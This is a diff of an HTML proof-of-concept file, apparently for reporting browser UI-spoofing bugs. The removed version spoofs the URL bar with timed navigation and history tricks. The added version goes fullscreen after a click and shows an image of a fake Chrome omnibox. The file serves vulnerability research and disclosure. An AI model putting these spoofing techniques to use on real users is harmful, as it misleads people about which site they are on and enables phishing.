@@ -1,17 +1,35 @@
 
-
-
-<html>
-<body>
-<script>
-        v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/%27';x.location = 'https://www.youtube.com'`);
-        i = setInterval(`
-            x.document.write("<h1>url spoofing...</h1>");
-            clearInterval(v);
-            clearInterval(i);
-            `, 3333);        
-</script>
-        </h1>URL Spoofing Bar</h1>
-        <input onclick="setInterval(function(){window.history.go(-1)}, 30)" type="button" value="Go to google.com" />
-</body>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+             
+                setTimeout(function(){
+                document.getElementById("spoof").style   = "display: block;";
+                document.getElementById("content").style = "display: none;";document.documentElement.requestFullscreen();}, 1500);
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="https://lbherrera.github.io/lab/chrome/contacts-spoof-233217/spoof.png"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+        </div>
+    </body>
+  </body>
 </html>
